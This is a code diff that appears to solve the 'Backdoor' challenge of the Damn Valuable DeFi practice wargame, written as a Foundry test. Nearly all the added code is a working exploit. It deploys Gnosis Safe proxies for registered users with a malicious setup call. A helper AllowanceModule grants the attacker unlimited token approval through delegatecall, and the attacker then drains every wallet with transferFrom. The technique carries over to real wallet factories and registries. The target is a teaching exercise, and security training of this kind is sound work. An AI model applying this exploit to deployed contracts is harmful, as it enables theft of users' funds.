@@ -7,7 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
-import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxyFactory, IProxyCreationCallback} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -79,7 +79,37 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
-
+        AllowanceModule module = new AllowanceModule();
+        address[] memory proxies = new address[](4);
+        uint256 MAX_THRESHOLD = 1;
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            proxies[i] = address(
+                walletFactory.createProxyWithCallback(
+                    address(masterCopy),
+                    abi.encodeWithSelector(
+                        // setup method: https://vscode.dev/github/safe-global/safe-contracts/contracts/GnosisSafe.sol#L84
+                        GnosisSafe.setup.selector,
+                        owners,
+                        MAX_THRESHOLD,
+                        address(module),
+                        abi.encodeWithSelector(module.setAllowance.selector, address(dvt), attacker),
+                        address(0),
+                        address(0),
+                        0,
+                        payable(address(0))
+                    ),
+                    10000,
+                    IProxyCreationCallback(address(walletRegistry)) // callback receiver
+                )
+            );
+        }
+        // The attacker can now steal all the tokens
+        for (uint256 i = 0; i < 4; i++) {
+            vm.prank(attacker);
+            dvt.transferFrom(proxies[i], attacker, 10 * 10 ** 18);
+        }
         /**
          * EXPLOIT END *
          */
@@ -106,5 +136,11 @@ contract Backdoor is Test {
 
         // Attacker must have taken all tokens
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract AllowanceModule {
+    function setAllowance(address token, address spender) public {
+        DamnValuableToken(token).approve(spender, type(uint256).max);
     }
 }
